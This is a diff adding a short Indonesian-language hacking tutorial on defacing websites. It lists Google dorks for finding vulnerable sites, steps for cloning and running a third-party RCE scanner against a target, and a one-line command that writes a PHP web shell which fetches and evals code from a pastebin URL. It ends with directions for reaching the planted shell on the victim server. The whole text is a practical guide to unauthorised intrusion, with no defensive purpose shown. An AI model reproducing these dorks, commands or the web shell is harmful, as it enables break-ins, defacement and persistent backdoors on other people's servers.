@@ -1,0 +1,45 @@
+Tutorial Deface dan upload shell
+==============================
+<pre>TUTORIAL DEFACE RCE
+-Termux/terminal
+-Dork fresh
+
+Ok gan kalo dah siap semua langsung kita ekse
+
+Dork:
+    ~ inurl:/brandUrl=http://
+    ~ inurl:/signin.php?ret=http
+    ~ +"Public" +"My Conferences" +"Personal Library" +"My Profile" +19.49.5200.0
+
+Masukin dork di atas ke gogel :D
+
+Nah kalo dah paham tinggal lu cari web vuln nya xD
+Caranya? Ezzz banget dong pastinya :*
+Kita install dulu tools rce nya.
+Buka termux/terminal
+
+Ketik command nya :
+$ pkg update && upgrade
+$ pkg install python
+$ pkg install wget
+$ pkg install bash
+$ git clone https://github.com/GarudaTersakti72/RCE
+$ ls
+$ cd RCE
+$ sh install.sh
+note : Kalo pake CMD,readline ganti pyreadline+install module manual,jangan sh install.sh atau ./install.sh
+Udah ? Nah kalo udah cara cek web vuln nya kek gini :
+
+Ketik : python Rce.py http://sitetarget.com
+
+Nah sekarang cara biar tau web itu pulen atau ga gimana? Ezzz kalo udah lu klik enter bakalan ada tulisan Vuln/Not Vuln
+
+Tinggal kita up shell deh
+
+Caranya? Ketik :
+
+$ echo '<?php eval("?>".file_get_contents("https://pastebin.com/raw/CurQrH1a")); ?>' > sel.php
+
+biar tau udh ke up apa belom?kalo ada tulisan no output berati berhasil
+
+Cara akses nya? http://sitetarget.com/scripts/namashellu.php</pre>
